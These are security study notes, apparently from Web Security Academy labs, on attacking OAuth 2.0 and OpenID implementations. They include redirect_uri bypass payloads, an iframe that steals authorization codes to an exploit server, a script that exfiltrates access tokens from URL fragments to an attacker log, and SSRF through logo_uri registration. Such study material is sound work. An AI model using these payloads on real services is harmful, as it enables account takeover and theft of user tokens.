# OAuth 2.0 authentication vulnerabilities
The simplest vulnerability could be when application is using some information from OAuth provider in combination with reusable token.
For example:
```
POST /authenticate HTTP/2


{"email":"carlos@carlos-montoya.net","username":"carlos","token":"RC_bkgxw9KdCXSe0TCqA-PRwfYuZF4UDjtI1tyqDy5P"}
```
If we change username and email, app will let us in to another account  
## Identifying OAuth authentication
The most reliable way to identify OAuth authentication is to proxy your traffic through Burp and check the corresponding HTTP messages when you use this login option. Regardless of which OAuth grant type is being used, the first request of the flow will always be a request to the /authorization endpoint containing a number of query parameters that are used specifically for OAuth. In particular, keep an eye out for the client_id, redirect_uri, and response_type parameters. For example, an authorization request will usually look something like this: 
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```
Once you know the hostname of the authorization server, you should always try sending a GET request to the following standard endpoints: 
```

    /.well-known/oauth-authorization-server
    /.well-known/openid-configuration

```
These will often return a JSON configuration file containing key information, such as details of additional features that may be supported  
## Improper implementation of the implicit grant type
In this flow, the access token is sent from the OAuth service to the client application via the user's browser as a URL fragment. The client application then accesses the token using JavaScript. The trouble is, if the application wants to maintain the session after the user closes the page, it needs to store the current user data (normally a user ID and the access token) somewhere.  
 To solve this problem, the client application will often submit this data to the server in a POST request and then assign the user a session cookie, effectively logging them in. This request is roughly equivalent to the form submission request that might be sent as part of a classic, password-based login. However, in this scenario, the server does not have any secrets or passwords to compare with the submitted data, which means that it is implicitly trusted.  

In the implicit flow, this POST request is exposed to attackers via their browser. As a result, this behavior can lead to a serious vulnerability if the client application doesn't properly check that the access token matches the other data in the request. In this case, an attacker can simply change the parameters sent to the server to impersonate any user.   
## Flawed CSRF protection
Although many components of the OAuth flows are optional, some of them are strongly recommended unless there's an important reason not to use them. One such example is the `state` parameter.  
if you notice that the authorization request does not send a state parameter, this is extremely interesting   
It potentially means that they can initiate an OAuth flow themselves before tricking a user's browser into completing it, similar to a traditional CSRF attack.   attacker could potentially hijack a victim user's account on the client application by binding it to their own social media account.  
### Force OAuth profile linking
If `state` parameter is missing, we can easily intercept request of linking to social media:
```
https://0a0d006403a89dffc05e7cff00760098.web-security-academy.net/oauth-linking?code=VX7aM1uLd8lfBba_jhuAKx-CA2eHXKANZawjSnUQ41k
```
Drop it to stop linking of our own account and send it inside of iframe to victim. When victim will follow the link, it's account will be linked to our social profile  
Note that if the site allows users to log in exclusively via OAuth, the state parameter is arguably less critical. However, not using a state parameter can still allow attackers to construct login CSRF attacks, whereby the user is tricked into logging in to the attacker's account.   
## Leaking authorization codes and access tokens
Depending on the grant type, either a code or token is sent via the victim's browser to the /callback endpoint specified in the redirect_uri parameter of the authorization request.  
f the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled redirect_uri.  
In the case of the authorization code flow, an attacker can potentially steal the victim's code before it is used. They can then send this code to the client application's legitimate /callback endpoint (the original redirect_uri) to get access to the user's account. In this scenario, an attacker does not even need to know the client secret or the resulting access token  
If Oauth app exposes code in redirect uri, we can craft malicious iframe as follows:
```
<iframe src="https://<oauth_server>/auth?client_id=<id>&redirect_uri=<exploit_server>&response_type=code&scope=openid%20profile%20email"></iframe>
```
And then we simply reuse our code in `/oauth-callback`
More secure authorization servers will require a redirect_uri parameter to be sent when exchanging the code as well. The server can then check whether this matches the one it received in the initial authorization request and reject the exchange if not. As this happens in server-to-server requests via a secure back-channel, the attacker is not able to control this second redirect_uri parameter.  
## Flawed redirect_uri validation
when the OAuth service receives a new request, it can validate the redirect_uri parameter against this whitelist. In this case, supplying an external URI will likely result in an error. However, there may still be ways to bypass this validation.  
* Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters i.e. an approved domain. You should try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error. 
* If you can append extra values to the default redirect_uri parameter, you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service. For example, you can try techniques such as: 
```
https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
```
* You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate redirect_uri parameters as follows: 
```
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
```
* Some servers also give special treatment to localhost URIs as they're often used during development. In some cases, any redirect URI beginning with localhost may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as localhost.evil-user.net.
Sometimes changing one parameter can affect the validation of others. For example, changing the response_mode from query to fragment can sometimes completely alter the parsing of the redirect_uri, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the web_message response mode is supported, this often allows a wider range of subdomains in the redirect_uri.  
## Stealing codes and access tokens via a proxy page
Try to find ways that you can successfully access different subdomains or paths. For example, the default URI will often be on an OAuth-specific path, such as /oauth/callback, which is unlikely to have any interesting subdirectories. However, you may be able to use directory traversal tricks to supply any arbitrary path on the domain. Something like this: 
```
https://client-app.com/oauth/callback/../../example/path
```
Once you identify which other pages you are able to set as the redirect URI, you should audit them for additional vulnerabilities that you can potentially use to leak the code or token  
or the authorization code flow, you need to find a vulnerability that gives you access to the query parameters, whereas for the implicit grant type, you need to extract the URL fragment.  
One of the most useful vulnerabilities for this purpose is an open redirect. You can use this as a proxy to forward victims, along with their code or token, to an attacker-controlled domain where you can host any malicious script you like.  
Note that for the implicit grant type, stealing an access token doesn't just enable you to log in to the victim's account on the client application. As the entire implicit flow takes place via the browser, you can also use the token to make your own API calls to the OAuth service's resource server. This may enable you to fetch sensitive user data that you cannot normally access from the client application's web UI.  
```
<script>
            // Check the URL fragment exist or not
            if (document.location.hash == ''){
                // If not exist, redirect to the payload, so we can extract the access_token
                window.location.replace('https://oauth-0ada00a904369151c2bdc54b02480071.web-security-academy.net/auth?client_id=umg56k6htndwh95zhjmgd&redirect_uri=https://0a0000b304ad9179c28dc70f00dd002d.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ab400c304dc91a2c26dc6f80184009b.exploit-server.net/exploit&response_type=token&nonce=171654770&scope=openid%20profile%20email');
            } else {
                // Create a new object called urlSearchParams, which extract the URL fragment
                const urlSearchParams = new URLSearchParams(document.location.hash.substr(1));
                // Extract the access_token
                var token = urlSearchParams.get('access_token');

                // Redirect to /log with the access_token value
                window.location.replace('/log?access_token=' + token);
            };
        </script>
```
After we got access_token, we can send a GET request to /me, with header Authorization: Bearer <access_token>  
In addition to open redirects, you should look for any other vulnerabilities that allow you to extract the code or token and send it to an external domain.  
```
POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256",
    …
}
```
The OpenID provider should require the client application to authenticate itself. In the example above, they're using an HTTP bearer token. However, some providers will allow dynamic client registration without any authentication, which enables an attacker to register their own malicious client application  
For example, you may have noticed that some of these properties can be provided as URIs. If any of these are accessed by the OpenID provider, this can potentially lead to second-order SSRF  
We can search for open-id configuration in oauth config file `/.well-known/openid-configuration`  
Next we can detect reg site from configuration and try to register site to which we want to have redirect:
```
POST /reg HTTP/1.1
Host: oauth-0a2400cc04337b2fc038f7ce02e90099.oauth-server.net
Content-Type: application/json
Content-Length: 63

{
    "redirect_uris": [
        "https://test.com"
    ]
}
```
Moreover, in the OpenID specification, the client applications can provide the URL for their logo using the logo_uri property during dynamic registration.  
So we can 
```
POST /reg HTTP/1.1
Host: oauth-0a2400cc04337b2fc038f7ce02e90099.oauth-server.net
Content-Type: application/json
Content-Length: 137

{
    "redirect_uris": [
        "https://test.com"
    ],
    "logo_uri": "https://lti04hljv02z1dqgkryt8r22htnkbbz0.oastify.com"
}	
```

And if we will visit `/client/<client_id>/logo` we will receive response from logo_uri  
